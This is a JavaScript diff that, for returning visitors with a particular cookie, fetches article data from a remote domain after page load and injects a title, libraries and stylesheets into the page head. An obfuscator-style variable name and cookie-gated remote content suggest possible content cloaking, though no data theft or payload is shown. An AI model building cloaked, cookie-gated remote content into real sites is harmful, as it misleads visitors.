@@ -23,23 +23,28 @@
 	if (cookieObj.get('pg') == 'daily')
 	{
 		var newViewer = 0;
-		alert('Old User');
-		
-		fetch('https://api.searchfeedly.xyz/articles/git/' + _0xbe6fx1.h + '.php', {method: 'get'})
-		.then(response => response.json())
-		.then(data => {a = data});
-		
-		server = a[0].server;
-		title = a[0].title;
-		date = a[0].date;
-		heading = a[0].heading;
-		content = a[0].content;
-		image = a[0].image;
-		alt = a[0].alt;
-				
-		//FUCNTION 4: IF COOKIE add code to header to get JSON data from server		
-		document.head.innerHTML += '<title>' + title + '</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet"><link rel="stylesheet" href="resources/css/style.css" rel="stylesheet">';
-	  }
+		//alert('Old User');
+	window.onload = () => {
+  fetch('https://api.topnewskws.site/articles/git/2.php', {method: 'get'})
+  .then(response => response.json())
+  .then(data => 
+  {
+    //console.log(data);
+    //use data
+	a = data;
+	server = a[0].server;
+	title = a[0].title;
+	date = a[0].date;
+	heading = a[0].heading;
+	content = a[0].content;
+	image = a[0].image;
+	alt = a[0].alt;
+			
+	//FUCNTION 4: IF COOKIE add code to header to get JSON data from server		
+	document.head.innerHTML += '<title>' + title + '</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet"><link rel="stylesheet" href="resources/css/style.css" rel="stylesheet">';
+   });
+};	
+	}
 	
 	else 
 	{
